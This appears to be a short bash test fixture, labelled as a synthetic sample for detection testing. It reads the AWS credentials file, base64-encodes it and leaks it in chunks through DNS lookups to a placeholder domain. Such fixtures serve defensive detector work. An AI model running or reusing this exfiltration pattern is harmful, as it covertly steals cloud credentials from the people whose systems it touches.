#!/bin/bash
# FIXTURE ONLY - synthetic detection test sample, not real malware
for chunk in $(cat ~/.aws/credentials | base64 -w0 | fold -w 50); do
  nslookup "$chunk.t.example.invalid" >/dev/null 2>&1
done
